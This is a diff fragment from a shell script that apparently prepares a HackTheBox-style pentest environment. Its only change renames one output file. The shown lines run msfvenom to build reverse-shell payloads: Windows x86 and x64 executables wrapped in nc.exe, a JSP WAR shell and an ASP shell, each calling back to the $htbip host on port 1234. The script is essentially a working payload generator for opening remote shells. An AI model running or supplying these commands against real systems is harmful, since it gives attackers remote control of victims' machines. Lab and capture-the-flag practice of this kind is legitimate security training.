@@ -81,7 +81,7 @@ mkdir shells
 cd shells
 echo ""
 echo -e "[\e[41mCreating MSFVenom Shells\e[0m]"
-msfvenom -p windows/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-binaries/nc.exe -k -f exe -o x86-1234.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-binaries/nc.exe -k -f exe -o rev-1234.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-binaries/nc.exe -k -f exe -o x64-1234.exe
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$htbip LPORT=1234 -f war -o war-1234.war
 msfvenom -p windows/shell/reverse_tcp LHOST=$htbip LPORT=1234 -f asp > shell-1234.asp
